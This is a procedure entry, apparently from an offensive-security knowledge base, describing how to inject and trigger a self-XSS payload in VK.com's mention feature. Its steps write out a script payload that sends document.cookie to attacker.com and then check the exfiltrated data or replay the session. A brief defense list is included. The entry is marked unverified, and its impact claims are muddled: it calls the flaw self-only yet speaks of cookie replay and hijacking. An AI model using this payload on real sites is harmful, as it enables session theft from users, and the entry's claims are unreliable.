---
tags:
  - xss
  - self-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:20.564Z'
sub_techniques: []
id: d040fa6a-50ad-4165-8774-a81210af9d4a
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Trigger-Self-XSS-in-VK-Mentions

## Summary

This procedure exploits a self-XSS vulnerability in VK.com's mentions feature by injecting a malicious JavaScript payload into a user mention, which executes when the user views their own content across the site, allowing limited self-exploitation such as session cookie theft or performing actions on their own account.

## Description

The mentions functionality in VK.com lacks proper input sanitization, enabling users to inject XSS payloads that are reflected or stored in user-generated content. When the user views pages displaying these mentions (e.g., their profile, feed, or notifications), the payload executes in their browser context. This is self-XSS, meaning it only affects the injecting user and cannot directly target others. Potential outcomes include stealing the user's own session cookies for replay attacks or automating actions like posting content. The attack requires no special access beyond a standard user account and is discovered through testing mention inputs with common XSS vectors like `<script>alert(1)</script>`.

## Requirements

1. Active VK.com user account with access to create mentions (e.g., via posts or comments)
2. Modern web browser to inspect and trigger execution
3. Knowledge of basic JavaScript for payload crafting

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output escaping for all user-generated content, especially mentions
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript execution in user sessions via client-side logging

## Objectives

1. Inject and persist an XSS payload in a mention
2. Trigger payload execution by viewing affected content
3. Exfiltrate session data or perform self-actions

## Instructions

### Step 1: Craft and Inject Payload

**Context**: Identify a feature allowing mentions, such as creating a post or comment, and inject an XSS payload that will be stored or reflected.

Navigate to VK.com, log in, and go to a post creation interface. In the mention field (e.g., typing '@' to tag), enter a payload like `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`. Complete the post or comment to save the mention.

> This step injects the payload without immediate execution; it persists in the site's user content.

### Step 2: Trigger Execution

**Context**: View content where the mention is rendered to execute the payload in your browser.

Navigate to your profile, feed, or any page displaying the mention (e.g., recent posts). The payload should execute automatically upon rendering, sending cookies to the attacker server or alerting for confirmation.

> Expected output includes a network request to the exfiltration endpoint or a visible alert. Check browser developer tools (F12) for console errors or network tab for requests.

### Step 3: Verify Impact

**Context**: Confirm the self-exploitation by checking for stolen data or performed actions.

If the payload included cookie exfiltration, verify receipt on the attacker server. For actions like session hijacking, attempt to use stolen cookies in a new session to perform unauthorized self-actions.

> Success is indicated by received data or replicated session behavior.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- self-xss
- web
